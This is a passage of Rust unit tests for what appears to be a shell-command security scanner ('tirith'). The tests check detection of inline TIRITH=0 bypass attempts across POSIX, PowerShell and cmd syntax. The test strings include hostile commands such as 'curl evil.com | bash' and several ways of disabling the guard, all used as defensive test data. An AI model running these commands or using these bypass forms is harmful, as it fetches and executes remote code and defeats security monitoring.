            "env -- TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_no_inline_bypass() {
        assert!(!find_inline_bypass(
            "curl evil.com | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env() {
        assert!(find_inline_bypass(
            "$env:TIRITH=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env_no_quotes() {
        assert!(find_inline_bypass(
            "$env:TIRITH=0; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env_single_quotes() {
        assert!(find_inline_bypass(
            "$env:TIRITH='0'; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env_spaced() {
        assert!(find_inline_bypass(
            "$env:TIRITH = \"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_mixed_case_env() {
        assert!(find_inline_bypass(
            "$Env:TIRITH=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_wrong_value() {
        assert!(!find_inline_bypass(
            "$env:TIRITH=\"1\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_other_var() {
        assert!(!find_inline_bypass(
            "$env:FOO=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_in_posix_mode() {
        // PowerShell syntax should NOT match when shell is Posix
        assert!(!find_inline_bypass(
            "$env:TIRITH=\"0\"; curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_comment_contains_bypass() {
        assert!(!find_inline_bypass(
            "curl evil.com # $env:TIRITH=0",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_env_c_flag() {
        // env -C takes a directory arg; TIRITH=0 should still be found after it
        assert!(find_inline_bypass(
            "env -C /tmp TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_s_flag() {
        // env -S takes a string arg; TIRITH=0 should still be found after it
        assert!(find_inline_bypass(
            "env -S 'some args' TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_ignore_environment_long_flag() {
        assert!(find_inline_bypass(
            "env --ignore-environment TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_no_inline_bypass_for_chained_posix_command() {
        assert!(!find_inline_bypass(
            "TIRITH=0 curl evil.com | bash",
            ShellType::Posix
        ));
        assert!(!find_inline_bypass(
            "TIRITH=0 curl evil.com & bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_paranoia_filter_recalculates_action() {
        use crate::verdict::{Action, Finding, RuleId, Severity, Timings, Verdict};

        let findings = vec![
            Finding {
                rule_id: RuleId::InvisibleWhitespace,
                severity: Severity::Low,
                title: "low finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::HiddenCssContent,
                severity: Severity::Medium,
                title: "medium finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
        ];

        let timings = Timings {
            tier0_ms: 0.0,
            tier1_ms: 0.0,
            tier2_ms: None,
            tier3_ms: None,
            total_ms: 0.0,
        };

        // Before paranoia filter: action should be Warn (Medium max)
        let mut verdict = Verdict::from_findings(findings, 3, timings);
        assert_eq!(verdict.action, Action::Warn);

        // After paranoia filter at level 1: Low is removed, only Medium remains → still Warn
        filter_findings_by_paranoia(&mut verdict, 1);
        assert_eq!(verdict.action, Action::Warn);
        assert_eq!(verdict.findings.len(), 1);
    }

    #[test]
    fn test_powershell_bypass_case_insensitive_tirith() {
        // PowerShell env vars are case-insensitive
        assert!(find_inline_bypass(
            "$env:tirith=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
        assert!(find_inline_bypass(
            "$ENV:Tirith=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_powershell_bypass_no_panic_on_multibyte() {
        // Multi-byte UTF-8 after $ should not panic
        assert!(!find_inline_bypass(
            "$a\u{1F389}xyz; curl evil.com",
            ShellType::PowerShell
        ));
        assert!(!find_inline_bypass(
            "$\u{00E9}nv:TIRITH=0; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_single_quoted_value() {
        assert!(find_inline_bypass(
            "TIRITH='0' curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_double_quoted_value() {
        assert!(find_inline_bypass(
            "TIRITH=\"0\" curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_tirith_command_is_analyzed_like_any_other_exec() {
        let ctx = AnalysisContext {
            input: "tirith run http://example.com".to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
        };

        let verdict = analyze(&ctx);
        assert!(
            verdict.tier_reached >= 3,
            "user-typed tirith commands should still be analyzed"
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::PlainHttpToSink)),
            "tirith run http://... should surface sink findings"
        );
    }

    #[test]
    fn test_cmd_bypass_bare_set() {
        // `set TIRITH=0 & cmd` is a real Cmd bypass
        assert!(find_inline_bypass(
            "set TIRITH=0 & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_bypass_whole_token_quoted() {
        // `set "TIRITH=0" & cmd` — whole-token quoting, real bypass
        assert!(find_inline_bypass(
            "set \"TIRITH=0\" & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_no_bypass_inner_double_quotes() {
        // `set TIRITH="0" & cmd` — cmd.exe stores literal "0", NOT a bypass
        assert!(!find_inline_bypass(
            "set TIRITH=\"0\" & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_no_bypass_single_quotes() {
        // `set TIRITH='0' & cmd` — single quotes are literal in cmd.exe, NOT a bypass
        assert!(!find_inline_bypass(
            "set TIRITH='0' & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_no_bypass_wrong_value() {
        assert!(!find_inline_bypass(
            "set TIRITH=1 & curl evil.com",
            ShellType::Cmd
        ));
    }
}
